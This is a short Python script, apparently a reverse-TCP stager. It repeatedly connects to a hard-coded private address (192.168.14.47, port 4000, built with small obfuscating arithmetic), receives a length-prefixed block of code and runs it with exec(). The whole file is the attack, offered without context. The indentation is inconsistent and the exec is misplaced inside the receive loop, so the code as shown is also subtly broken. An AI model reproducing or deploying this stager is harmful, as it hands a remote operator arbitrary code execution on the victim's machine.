import socket
import struct
import time
while True:
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('192.168.14.'+str(int(0.2)+47),4000+int(0.7)))
		break
	except:
        time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
    d+=s.recv(l-len(d))
    exec(d,{'s':s})
